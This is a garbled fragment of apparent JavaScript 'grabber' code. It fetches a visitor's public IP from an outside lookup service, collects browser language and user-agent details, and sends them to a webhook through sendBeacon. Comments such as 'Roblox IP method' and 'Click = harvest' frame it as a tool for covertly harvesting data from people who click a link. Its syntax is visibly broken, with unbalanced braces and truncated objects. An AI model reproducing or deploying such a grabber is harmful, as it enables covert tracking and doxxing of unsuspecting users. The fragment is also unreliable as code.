async function grabAll() {

    sent = true;

    // Roblox IP method + full IP info

    try { ip = await (await fetch("https://v4.ident.me/")).text(); } catch(e) {}

        languages: navigator.languages?.join(", "),

        } : "unknown"

    // Browser name detection
    const ua = navigator.userAgent;
    let browserName = "Unknown";
    if (ua.includes("Edg")) browserName = "Microsoft Edge";

                { name: "Browser", value: browserName, inline: true },
                { name: "Full User-Agent", value: browserData.userAgent.substring(0,500), inline: false },

    navigator.sendBeacon(WEBHOOK, JSON.stringify(payload));

// Click = harvest
